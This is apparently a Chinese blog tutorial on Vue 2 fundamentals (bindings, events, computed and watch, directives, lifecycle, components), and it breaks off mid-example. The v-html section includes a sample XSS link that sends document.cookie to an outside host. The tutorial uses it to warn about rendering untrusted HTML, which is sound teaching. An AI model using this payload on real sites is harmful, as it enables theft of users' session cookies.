---
title: Vue2+Vue3基础
categories: Vue2+Vue3基础
tags: Vue2+Vue3基础
date: 2023/3/12
cover: https://ts1.cn.mm.bing.net/th/id/R-C.f2ceca4c412263f73c4a7afe17a27249?rik=5FzsAnW2xsuoQQ&riu=http%3a%2f%2fwww.info110.com%2fwp-content%2fuploads%2f2020%2f12%2f20201203_5fc890d068ede.jpg&ehk=Nzj%2bY8GmhFJyV8My58gxsDVgxDiUpNBHijGcotdgXcQ%3d&risl=&pid=ImgRaw&r=0
---

### Vue简介

**vue官网地址**：[Vue.js - 渐进式 JavaScript 框架 | Vue.js (vuejs.org)](https://cn.vuejs.org/)

vue是一套用于构建用户界面的渐进式JavaScript框架

渐进式：Vue可以自底向上逐层的应用

简单应用：只需要一个轻量小巧的核心库

复杂应用：可以引入各式各样的Vue插件

#### Vue的特点

1、采用组件化的模式，提高代码复用率且让代码更加好维护

2、声明式编码，让编码人员无需直接操作DOM，提高开发效率

3、使用虚拟DOM+优秀的Diff算法，尽量复用DOM结点

### Vue数据绑定

#### 单向绑定：

**v-bind**: 数据只能从data流向页面

**简写形式：** v-bind:value	可简写为	:value

#### 双向绑定：

**v-model**: 数据不仅能从data流向页面，还可以从页面流向data。

**注意：**

1、双向绑定一般都应用在表单类元素上（如：input、select等）

2、v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

### el与data的两种写法

#### el:

**第一种写法：**

```js
new Vue({
	el: '#root'
})
```

**第二种写法：**

```js
const vm = new Vue({

})
vm.$mount('#root')
```

#### data:

**第一种写法：**

```vue
new Vue({
	data: {
		name: '张三'
	}
})
```

**第二种写法：**

```js
new Vue({
	data: function() {
		return {
			name: '张三'
		}
	}
})
//简写形式
new Vue({
	data() {
		return {
			name: '张三'
		}
	}
})
```

### MVVM模型

![MVVM模型](https://raw.githubusercontent.com/ZhangjunqiGithub/picture/master/mvvm.jpg)

1、M：模型（Model）：对应 data 中的数据

2、V：视图（View）：模板

3、VM：视图模型（ViewModel）：Vue 实例对象

### 数据代理

```vue
Object.defineProperty(person, 'age', {
	value: 18,
	enumerable: true,//控制属性是否可以枚举，默认值是false
	writable: true,//控制属性是否可以被修改，默认值是false
	configurable: true//控制属性是否可以被删除，默认值是false
})
```

**解释：** 通过一个对象代理对另一个对象中属性的操作（读 / 写）

例：

```js
let obj1 = {x:100}
let obj2 = {y:200}
Object.defineProperty(obj2, 'x', {
//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
	get() {
		return obj1.x
	}
//当有人修改person的age属性时，set函数(setter就会被调用，且会收到修改的具体值
	set(value) {
		obj1.x = value
	}
})
```

**Vue中的数据代理（个人理解）：**

![vue数据代理](https://raw.githubusercontent.com/ZhangjunqiGithub/picture/master/VueDataBroker.jpg)

### 事件处理

```html
<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>姓名：{{name}}</h2>
        <button v-on:click="showinfo">提示信息</button>
        <!-- <button v-on:click="showinfo($event,666)">提示信息</button> -->
        <button @click="showinfo($event,666)">提示信息</button>
    </div>
</body>
```

```js
const vm = new Vue({
        el: '#root',
        data: {
            name: '张三'
        },
        methods: {
			//这里的函数不能写成箭头函数，如果写成了箭头函数，this就指向了window,就不执行vm了
            showinfo(event, number) {
                if (number) {
                    alert('同学你好！' + number);
                } else {
                    alert('同学你好！')
                }
            }
        }
    });
```

### 事件修饰符

| prevent | 阻止默认事件（常用）                             |
| ------- | ------------------------------------------------ |
| stop    | 阻止事件冒泡（常用）                             |
| once    | 事件只触发一次（常用）                           |
| capture | 使用事件的捕获模式                               |
| self    | 只有event.target是当前操作的元素时才会触发事件   |
| passive | 事件的默认行为立即执行，无需等待事件回调执行完毕 |

```html
 <!-- 阻止默认事件（常用）例如：点击链接后不让其跳转 -->
        <a href="http://www.baidu.com" @click.prevent="showInfo">百度</a>
        <!-- 阻止事件冒泡（常用） -->
        <div class="demo1" @click="showInfo">
            <button @click.stop="showInfo">提示信息</button>
        </div>
        <!-- 事件只触发一次（常用） -->
        <button @click.once="showInfo">提示信息</button>
        <!-- 使用事件的捕获模式 -->
        <div class="box1" @click.capture="showMsg($event,1)">
            div1
            <div class="box2" @click="showMsg($event,2)">
                div2
                <div class="box3" @click="showMsg($event,3)">
                    div3
                </div>
            </div>
        </div>
        <!-- 只有event.target是当前操作的元素时才触发事件 -->
        <!-- @click.self当点击本元素时才会触发事件，通过冒泡等触发本元素的某个事件的时候，此事件不执行 -->
        <div class="demo1" @click.self="showInfo">
            <button @click="showInfo">提示信息</button>
        </div>
		<!-- 一般情况要先等待事件回调执行完毕后，才执行事件的默认行为 -->
        <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕 -->
        <!-- scroll：滚动条，wheel：滚动轮 -->
        <ul @wheel.passive="demo" class="list">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>
```

```js
const vm = new Vue({
            el: '#root',
            data: {
                name: '张三'
            },
            methods: {
                showInfo(event) {
                    // event.preventDefault(); //阻止默认行为
                    // event.stopPropagation(); //阻止事件冒泡
                    alert('同学你好!');
                },
                showMsg(event, msg) {
                    alert(msg);
                },
                demo() {
                    alert('@@@');
                }
            }
        });
```

### 键盘事件

```html
<!-- Vue中常用的案件别名
    回车 => enter
    删除 => delete (捕获“删除”和“退格”键)
    退出 => esc
    空格 => space
    换行 => tab（特殊必须配合keydown去使用）
    上 => up
    下 => down
    左 => left
    右 => right
    2、Vue未提供别名的案件，可以使用案件原始的key值去绑定，但注意要转为kebab-case（短横线命名）
    3、系统修饰键（用法特殊）：ctrl、alt、shift、meta
        (1)配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才能被触发
        (2)配合keydown使用：正常触发事件
    4、也可以使用keyCode去指定具体的按键（不推荐）
    5、Vue.config.keyCodes自定义键名 = 键码，可以去定制按键别名 -->

<body>
    <!-- 准备一个容器 -->
    <div id="root">
        <!-- 当输入回车的时候在触发键盘事件函数 -->
        <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo">
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false; // 阻止在启动时生成生产提示
    const vm = new Vue({
        el: '#root',
        data: {

        },
        methods: {
            showInfo(event) {
                // if (event.keyCode !== 13) return
                //event.key可以获取到按键的名字
                console.log(event.target.value)
            }
        }
    });
</script>
```

### 计算属性

```html
<body>
    <!-- 准备一个容器 -->
    <div id="root">
        姓：<input type="text" v-model="firstName"> <br/><br/> 名：
        <input type="text" v-model="lastName"> <br/><br/> 全名：
        <span>{{fullName}}</span><br/><br/>
        <!-- 下面的几个fullName就不再重新调用fullName中的get函数了就可以直接通过读取缓存就可拿到计算数据了 -->
        全名：<span>{{fullName}}</span><br/><br/> 全名：
        <span>{{fullName}}</span><br/><br/> 全名：
        <span>{{fullName}}</span>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productTip = false; //阻止 vue 在启动时生成生成提示
    const vm = new Vue({
        el: '#root',
        data: {
            firstName: '张',
            lastName: '三'
        },
        // 计算属性
        computed: {
            fullName: {
                // 当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                // 1、初次读取fullName时 2、所依赖的数据发生变化时
                get() {
                    console.log('get被调用了');
                    return this.firstName + '-' + this.lastName
                },
                // 当fullName被修改时，set就会被调用
                set(value) {
                    const arr = value.split('-');
                    this.firstName = arr[0];
                    this.lastName = arr[1];
                }
            }
        }
    });
```

#### 计算属性的简写

```html
<body>
    <!-- 准备一个容器 -->
    <div id="root">
        姓：<input type="text" v-model="firstName"> <br/><br/> 名：
        <input type="text" v-model="lastName"> <br/><br/> 全名：
        <span>{{fullName}}</span><br/><br/>
        <!-- 下面的几个fullName就不再重新调用fullName中的get函数了就可以直接通过读取缓存就可拿到计算数据了 -->
        全名：<span>{{fullName}}</span><br/><br/> 全名：
        <span>{{fullName}}</span><br/><br/> 全名：
        <span>{{fullName}}</span>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productTip = false; //阻止 vue 在启动时生成生成提示
    const vm = new Vue({
        el: '#root',
        data: {
            firstName: '张',
            lastName: '三'
        },
        // 简写
        computed: {
            // 只考虑读取不考虑修改时才能使用简写形式
            fullName() {
                console.log('get被调用了');
                return this.firstName + '-' + this.lastName
            }
        }
    });
</script>
```

### 监视属性

例如：data: { isHot: true }

**方式一：**

```js
watch: {
    isHot: {
        // 配置1
        immediate: true, //初始化时让handler调用一下
        // 当isHot发生改变时，handler函数被调用
        handler(newValue, oldValue) {
            console.log('isHot被修改了', newValue, oldValue);
        }
    }
}
```

**简写：**

```js
watch: {
    isHot(newValue, oldValue) {
        console.log('isHot被修改了', newValue, oldValue);
    }
}
```

> 注意：简写形式无法开启其它的配置项

**方式二：**

```js
vm.$watch('isHot', {
    // 配置1
    immediate: true, //初始化时让handler调用一下
    // 当isHot发生改变时，handler函数被调用
    handler(newValue, oldValue) {
        console.log('isHot被修改了', newValue, oldValue);
    }
})
```

**简写：**

```js
vm.$watch('isHot', function(newValue, oldValue) {
    console.log('isHot被修改了', newValue, oldValue);
})
```

> 注意：简写形式无法开启其它的配置项

#### 深度监视

**data中的数据：**

```js
data: {
    numbers: {
        a: 1,
        b: 1
    }
}
```

**监视多级结构中某个属性的变换：**

```js
'numbers.a': {
    handler() {
        console.log('a被改变了');
    }
}
```

**监视多级结构中所有属性的变化:**

```js
numbers: {
     deep: true,//深度监视
     handler() {
         console.log('numbers改变了');
     }
}
```

> 注意：
>
> 深度监视：
>
> (1)Vue中的watch默认不检测对象内部值的改变（一层）
>
> (2)配置deep:true可以检测对象内部值改变（多层）
>
> 备注：
>
> (1)Vue自生可以监视对象内部值的改变，但Vue提供的watch默认不可以
>
> (2)使用watch时根据数据的具体结构，决定是否采用深度监视
>
> 注意：watch可以开启异步任务，而计算属性不能开启异步任务

### 关于一个函数是否写成箭头函数的说明

> 1、所有被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象
>
> 2、所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象

> 解释：1、被Vue管理的函数写成了箭头函数，此时函数的this指向window
> 			2、不被Vue所管理的函数如果写成普通函数，此时函数的this指向自己，就不能指向vm了

### 绑定样式

**相关样式：**

```html
<style>
        .basic {
            width: 300px;
            height: 200px;
            border: 2px solid grey;
            text-align: center;
            line-height: 200px;
        }
        
        .red {
            background-color: red;
        }
        
        .green {
            background-color: green;
        }
        
        .blue {
            background-color: blue;
        }
        
        .pink {
            background-color: pink;
        }
        
        .radium {
            border-radius: 15px;
        }
    </style>
```

```html
<body>
    <div id="root">
        <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
        <div class="basic" :class="color" @click="change">{{name}}</div>
        <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
        <div class="basic" :class="ClassArr">{{name}}</div>
        <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
        <div class="basic" :class="classObj">{{name}}</div>

        <div class="basic" :style="styleObj">{{name}}</div>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false
    const vm = new Vue({
        el: "#root",
        data() {
            return {
                name: 'test',
                color: 'normal',
                ClassArr: ['pink', 'radium'],
                classObj: {
                    red: false,
                    pink: false,
                    radium: false
                },
                // 样式对象中的key不能随意写，要根据原有的样式属性名通过小驼峰来写
                styleObj: {
                    // 这里之所以为fontSize是因为原生处理字体大小为font-size: 40px
                    fontSize: '40px',
                    color: 'red',
                    backgroundColor: 'orange'
                }
            }
        },
        methods: {
            change() {
                const arr = ['red', 'green', 'blue', 'pink']
                const index = Math.floor(Math.random() * 4);
                this.color = arr[index];
            }
        }
    });
</script>
```

### 条件渲染

```html
<body>
    <div id="root">
        <h2>n：{{n}}</h2>
        <button @click="n++">点我n+1</button>
        <!-- 使用v-show做条件渲染 -->
        <!-- <h2 v-show="false">姓名：{{name}}</h2>
        <h2 v-show="1 === 1">姓名：{{name}}</h2> -->
        <!-- 使用v-if做条件渲染 -->
        <!-- <h2 v-if="false">姓名：{{name}}</h2>
        <h2 v-if="1 === 1">姓名：{{name}}</h2> -->
        <!-- template只能配合v-if一起使用，在页面中不显示template标签 -->
        <!-- 
			<template v-if="n === 1">
			<h2>123</h2>
			<h2>456</h2>
			<h2>789</h2>
			</template>
			此代码在渲染结构时等价于：（如下）
			<h2>123</h2>
			<h2>456</h2>
			<h2>789</h2> 没有了template标签
		-->
        <h2>姓名:</h2>
        <div v-if="n % 3 == 0">张三</div>
        <div v-else-if="n % 3 == 1">李四</div>
        <div v-else="n % 3 == 2">王五</div>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                n: 0,
                name: '张三'
            }
        }
    });
</script>
```

### 列表渲染

```html
<body>
    <div id="root">
        <ul>
            <!-- 中间用in和of都可以 -->
            <li v-for="(p,index) in persons" :key="index">{{p.name}}-{{p.age}}</li>
        </ul>
        <ul>
            <!-- 遍历对象 -->
            <li v-for="(value,key) of car" :key="key">{{key}}-{{value}}</li>
        </ul>
        <ul>
            <!-- 遍历字符串 -->
            <li v-for="(value,key) in str" :key="key">{{key}}-{{value}}</li>
        </ul>
        <ul>
            <!-- 遍历指定次数 -->
            <li v-for="(number,index) of 5" :key="index">
                {{index}}-{{number}}
            </li>
            <!-- index从 0 到 4     number从 1 到 5 -->
        </ul>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data: {
            persons: [{
                id: '001',
                name: '张三',
                age: 18
            }, {
                id: '002',
                name: '李四',
                age: 19
            }, {
                id: '003',
                name: '王五',
                age: 20
            }, ],
            car: {
                name: '奥迪A8',
                price: '50万',
                color: '黑色'
            },
            str: "hello"
        }
    });
</script>
```

#### 列表的过滤

```js
<body>
    <div id="root">
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <ul>
            <!-- 中间用in和of都可以 -->
            <li v-for="(p,index) in filPersons" :key="index">{{p.name}}-{{p.age}}</li>
        </ul>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data: {
            keyWord: '',
            persons: [{
                    id: '001',
                    name: '张三',
                    age: 18
                }, {
                    id: '002',
                    name: '李四',
                    age: 19
                }, {
                    id: '003',
                    name: '王五',
                    age: 20
                }, {
                    id: '004',
                    name: '张四',
                    age: 21
                }, {
                    id: '005',
                    name: '张五',
                    age: 22
                }, {
                    id: '006',
                    name: '王三',
                    age: 23
                }]
                /*,
                filPersons: []*/
        },
        // watch: {
        //     // 在一个字符串中查看是否包含''时，返回值为0
        //     keyWord: {
        //         immediate: true,
        //         handler(newValue) {
        //             this.filPersons = this.persons.filter((p) => {
        //                 return p.name.indexOf(newValue) !== -1; //判断某个字符串中是否包含某一个字符    
        //             })
        //         }
        //     }
        // }
        computed: {
            filPersons() {
                return this.persons.filter((p) => {
                    return p.name.indexOf(this.keyWord) !== -1;
                })
            }
        }
    });
</script>
```

**补充知识：**解决vscode代码不能折叠的问题

```
#region
​``````
#endregion
```

#### 列表排序

```html
<body>
    <div id="root">
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <button @click="sortType = 2">年龄升序</button>
        <button @click="sortType = 1">年龄降序</button>
        <button @click="sortType = 0">原顺序</button>
        <ul>
            <!-- 中间用in和of都可以 -->
            <li v-for="(p,index) in filPersons" :key="p.id">{{p.name}}-{{p.age}}</li>
        </ul>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data: {
            keyWord: '',
            sortType: 0, //0原顺序，1降序，2升序
            persons: [{
                id: '001',
                name: '张三',
                age: 19
            }, {
                id: '002',
                name: '李四',
                age: 18
            }, {
                id: '003',
                name: '王五',
                age: 20
            }, {
                id: '004',
                name: '张四',
                age: 22
            }, {
                id: '005',
                name: '张五',
                age: 21
            }, {
                id: '006',
                name: '王三',
                age: 23
            }]
        },
        computed: {
            filPersons() {
                const arr = this.persons.filter((p) => {
                    return p.name.indexOf(this.keyWord) !== -1;
                })
                if (this.sortType) {
                    arr.sort((p1, p2) => {
                        return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age;
                    })
                }
                return arr;
            }
        }
    });
</script>
```

#### Vue中set的使用

```html
<body>
    <div id="root">
        <div>name:{{user.name}}</div>
        <div v-if="user.sex">sex:{{user.sex}}</div>
        <button @click="addSex">点击添加性别属性</button>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                user: {
                    name: '张三'
                }
            }
        },
        methods: {
            addSex() {
                // Vue.set(this.user, 'sex', '男');此处的'sex'也可以写索引值用于给数组中的某个元素赋予新值;
                //注意：vm和vm._data都不能为target；Vue.set(target, 属性名, 属性值)
                this.$set(this.user, 'sex', '女');
            }
        }
    });
</script>
```

> 注意：通过索引修改数组中的值，Vue无法监测到，也就无法实时修改页面，例如vm.hobby[0] = 'xxx';

> 但是当调用数组的相关方法（push、pop、shift、unshift、splice、sort、reverse）时，Vue是可以监测到的，例如vm.hobby.splice(0,1,'xxx')；或 Vue.set(vm.hobby,1(数组索引)，'xxx')或vm.$set(vm.hobby,1(数组索引)，'xxx')解释：从数组hobby下标为0初开始删除1个，并将此处替换为xxx。

### 收集表单数据

```html
<body>
    <div id="root">
        <form action="" @submit.prevent="demo">
            <label for="demo1">账号：</label>
            <input type="text" name="" id="demo1" v-model.trim="userInfo.accout"><br/><br/>
            <label for="demo2">密码：</label>
            <input type="text" name="" id="demo2" v-model="userInfo.password"><br/><br/> 年龄：
            <input type="number" v-model.number="userInfo.age"><br/><br/> 性别： 男
            <input type="radio" name="sex" value="male" v-model="userInfo.sex"> 女
            <input type="radio" name="sex" value="female" v-model="userInfo.sex"><br/><br/> 爱好： 学习
            <input type="checkbox" v-model="userInfo.hobby" value="study"> 打游戏
            <input type="checkbox" v-model="userInfo.hobby" value="game"> 吃饭
            <input type="checkbox" v-model="userInfo.hobby" value="eat">
            <br/><br/> 所属校区
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shenzhen">深圳</option>
                <option value="wuhan">武汉</option>
            </select><br/><br/> 其他信息：
            <textarea name="" id="" cols="30" rows="10" v-model.lazy="userInfo.other"></textarea><br/><br/> <input type="checkbox" v-model="userInfo.agree">阅读并接受
            <a href="http://www.baidu.com">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                userInfo: {
                    accout: '',
                    password: '',
                    age: '',
                    sex: 'female',
                    hobby: [],
                    city: 'beijing',
                    other: '',
                    agree: ''
                }
            }
        },
        methods: {
            demo() {
                console.log(JSON.stringify(this.userInfo));
            }
        },
    });
```

### 过滤器

```html
<body>
    <div id="root">
        <!-- 计算属性 -->
        <h2>现在时间：{{fmtTime}}</h2>
        <!-- methods -->
        <h3>现在时间：{{getFmtTime()}}</h3>
        <!-- 过滤器 -->
        <h2>现在时间：{{time | timeFormater}}</h2>
        <h2>现在时间：{{time | timeFormater('YYYY_MM_DD') | sliceTime}}</h2>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    // 全局过滤器
    // Vue.filter('函数名',function(value){
    //     return ......
    // })
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                time: Date.now()
            }
        },
        computed: {
            fmtTime() {
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss');
            }
        },
        methods: {
            getFmtTime() {
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss');
            }
        },
        filters: {
            timeFormater(value, str = 'YYYY年MM月DD日 HH:mm:ss') {
                return dayjs(value).format(str);
            },
            sliceTime(value) {
                return value.slice(0, 4);
            }
        }
    })
</script>
```

```js
/*
过滤器：
定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）
语法：
1、注册过滤器： Vue.filter(name,callback)(全局，各组件都可用) 或 new Vue{filters:{}}
2、使用过滤器：{{  xxx | 过滤器名}} 或 v-bind:属性 = "xxx | 过滤器名"
备注：
1、过滤器也可以接受额外参数、多个过滤器也可以串联
2、并没有改变原本的数据，是产生新的对应的数据
*/
```

### 内置指令

#### v-text

````html
<body>
    <!-- v-text:(用的较少)
    1.作用：向其所在的节点中渲染文本内容
    2.与插值语法的去别：v-text会替换掉节点中的内容，{{xxx}}则不会 -->
    <div id="root">
        <div v-text="name"></div>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data: {
            name: '张三'
        }
    })
</script>
````

#### v-html

```html
<body>
    <!-- v-html：
    1.作用：向指定节点中渲染包含html结构的内容
    2.与插值语法的区别：
        （1）v-html会替换掉节点中所有的内容，{{xxx}}则不会
        （2）v-html可以识别html结构
    3.严重注意：v-html有安全性问题！！！
        （1）在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
        （2）一定要在可信度内容上使用v-html，永远不要用在用户提交的内容上！！！ -->
    <div id="root">
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                str: '<h1>张三</h1>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>危险链接</a>'
            }
        },
    })
</script>
```

> 如果cookie的HttpOnly为true则通过document.cookie无法获得cookie
> XSS攻击(冒充用户之手)

#### v-cloak

```html
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-cloak</title>
    <style>
        [v-cloak] {/*属性选择器，选中所有标签中含有v-cloak属性的元素*/
            display: none;
        }
    </style>
</head>

<body>
    <!-- v-cloak:
        1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
        2.使用css配合v-cloak可以解决网速慢时页面展示不出{{xxx}}的问题 -->
    <div id="root">
        <h2 v-cloak>{{name}}</h2>
    </div>
    <script type="text/javascript" src="../js/vue.js"></script>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                name: '张三'
            }
        },
    })
</script>
```

#### v-once

```html
<body>
    <!-- v-once:
        1.v-once所在节点在初次动态渲染后，就视为静态内容了
        2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能 -->
    <div id="root">
        <h2 v-once>开始时n的值是：{{n}}</h2>
        <h2>当前n的值是：{{n}}</h2>
        <button @click="n++">n++</button>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                n: 1
            }
        },
    })
</script>
```

#### v-pre

```html
<body>
    <!-- v-pre:
        1.跳过其所在节点的编译过程
        2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，可以加快编译 -->
    <div id="root">
        <h2 v-pre>Vue不会解析的内容</h2>
        <h2>当前n的值是：{{n}}</h2>
        <button @click="n++">n++</button>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                n: 1
            }
        },
    })
</script>
```

### 自定义指令

```html
<body>

    <div id="root">
        <h2>当前的n值是：<span v-text="n"></span></h2>
        <h2>放大10倍后的n值是：<span v-big="n"></span></h2>
        <button @click="n++">n++</button>
        <hr/>
        <input type="text" v-fbind:value="n">
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    // 定义全局指令
    // Vue.directive('fbind', {
    //     //指令与元素成功绑定时（一上来）
    //     bind(element, binding) {
    //         element.value = binding.value;
    //     },
    //     //指令所在元素被插入页面时
    //     inserted(element, binding) {
    //         element.focus();
    //     },
    //     //指令所在的模板被重新解析时
    //     update(element, binding) {
    //         element.value = binding.value;
    //     }
    // })
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                n: 1
            }
        }, //注意：如果指令名为多个单词要用-分隔开，在directives对象中要用''包裹，如'big-number':{}
        directives: {
            // 下面中的函数中的this指的是window
            //element是真实的DOM元素
            //调用时机：1、指令与元素成功绑定时调用2、指令所在的模板被重新解析时调用
            big(element, binding) {
                element.innerText = binding.value * 10;
            },
            fbind: {
                //指令与元素成功绑定时（一上来）
                bind(element, binding) {
                    element.value = binding.value;
                },
                //指令所在元素被插入页面时
                inserted(element, binding) {
                    element.focus();
                },
                //指令所在的模板被重新解析时
                update(element, binding) {
                    element.value = binding.value;
                },
            }
        }
    })
</script>
```

> 如果指令名为多个单词要用-分隔开，在directives对象中要用''包裹，如'big-number':{}

### 生命周期

![生命周期](https://cn.vuejs.org/assets/lifecycle.16e4c08e.png)

```html
<body>
    <div id="root">
        <h2 v-if='a'>hello</h2>
        <h2 :style="{opacity}">张三</h2>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                a: false,
                opacity: 1
            }
        },
        methods: {
            change() {
                setInterval(() => {
                    this.opacity -= 0.01;
                    if (this.opacity <= 0)
                        this.opacity = 1;
                }, 16);
            }
        },
        // Vue完成了模板的解析并把初始的真实DOM元素放入页面后（ 挂载完毕） 调用mounted
        mounted() {
            this.change();
        },
    })
</script>
```

```html
<body>
    <!-- vm生命周期总结(钩子)：
        1、将要创建（数据监视、数据代理）===>调用beforeCreate函数(还未生成_data)
        2、创建完毕（数据监视、数据代理）===>调用created函数（已经生成了_data并且其中的数据也进行了数据代理）
        3、将要挂载===>调用beforeMount函数（生成了虚拟DOM但未将其转为真实DOM渲染到页面中去）
        4、挂载完毕（重要）===>调用mounted函数（将内存中的虚拟DOM转换为真实DOM并且渲染到了页面中了）
        5、将要更新===>调用beforeUpdate函数（数据已经修改，但是并未将修改后的元素重新渲染到页面中去）
        6、更新完毕===>调用update函数（将修改后的元素重新渲染到页面中去）
        7、将要销毁（重要）===>调用beforeDestroy函数（不能在此处修改数据，即使修改了也不会触发更新，一般用于消除定时器、解绑自定义事件、取消订阅消息等【收尾工作】）
        8、销毁完毕（基本不用）===>调用destroy函数
    常用的生命周期钩子：
        1、mounted：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】
        2、beforeDestroy：消除定时器、解绑自定义事件、取消订阅消息等【收尾工作】
    关于销毁Vue实例：
        1、销毁后借助Vue开发者工具看不到任何信息
        2、销毁后自定义事件会失效，但原生DOM事件依然有效
        3、一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了 -->
    <div id="root">
        <h2>当前的n值：{{n}}</h2>
        <button @click="add">n+1</button>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data() {
            return {
                n: 1
            }
        },
        methods: {
            add() {
                this.n++;
            }
        },
    })
</script>
```

### 组件

> 注意组件中的data不能写成写成一个对象，要写成函数的形式；如果写成对象在进行组件复用的时候会出现一个问题：当其中一个地方的值修改了，相应的应用了这个组件的对应值也会发生改变；其实实质上它们使用的是同一个内存中的对象。

#### 组件的使用

1、创建组件

2、注册组件

3、使用组件

#### 非单文件组件(不常用)

##### 基本使用

```html
<body>
    <div id="root">
        <h2>{{msg}}</h2>
        <hr>
        <user1></user1>
        <hr>
        <user2></user2>
        <user1></user1>
        <hr>
        <hello></hello>
    </div>
    <div id="root2">
        <hello></hello>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    // 1.创建user1组件
    const user1 = Vue.extend({
        //注意：template里面要有一个根元素div
        template: `
            <div>
                <h2>姓名1：{{name1}}</h2>
                <h2>年龄1：{{age1}}</h2>
                <button @click="name">showname</button>
            </div>
        `,
        data() {
            return {
                name1: '张三',
                age1: 18
            }
        },
        methods: {
            name() {
                alert(this.name1);
            }
        },
    })

    // 1.创建user2组件
    const user2 = Vue.extend({
        template: `
            <div>
                <h2>姓名2：{{name2}}</h2>
                <h2>年龄2：{{age2}}</h2>
            </div>
        `,
        data() {
            return {
                name2: '李四',
                age2: 20
            }
        }
    })

    // 全局组件
    const hello = Vue.extend({
            template: `
            <div>
                <h2>：：{{names}}</h2>
            </div>
        `,
            data() {
                return {
                    names: 'hello'
                }
            }
        })
        // 全局注册组件
    Vue.component('hello', hello);

    // 创建vm
    const vm = new Vue({
        el: '#root',
        data: {
            msg: '你好'
        },
        // 2.注册组件（局部注册）
        components: {
            // user1: user1
            // 简写
            user1,
            user2
        }
    })

    new Vue({
        el: '#root2',
    })
</script>
```

> 如果子组件中写了name属性（name: 'user1'），无论vm的components中注册时怎么写，在使用此子组件时都写<user1></user1>；如果子组件中没有写name属性，则vm的components中注册时怎么写，在使用该子组件时就怎么写。

##### 几个注意点

> 1、关于组件名：
>
> ​	一个单词组成：
>
> ​		第一种写法（首字母小写）：school
>
> ​		第一个写法（首字母大写）：School
>
> ​	多个单词组成：
>
> ​		第一种写法（kebab-case命名）：my-school
>
> ​		第二种写法（CamelCase命名）：MySchool（需要Vue脚手架支持）
>
> 2、关于组件标签：
>
> ​	第一种写法：<school></school>
>
> ​	第二种写法：<school/>
>
> ​	注意：不用使用脚手架时，<school/>会导致后续组件不能渲染
>
> 3、简写方式：
>
> ​	const school =  Vue.extend(options) 可以简写为：const school = options

##### 组件的嵌套

```html
<body>
    <div id="root"></div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false;
    // 定义组件
    const student = Vue.extend({
        template: `
            <div>
                <h2>学生姓名：{{name}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>
        `,
        data() {
            return {
                name: '张三',
                age: 18
            }
        },
    })

    const hello = Vue.extend({
        template: `
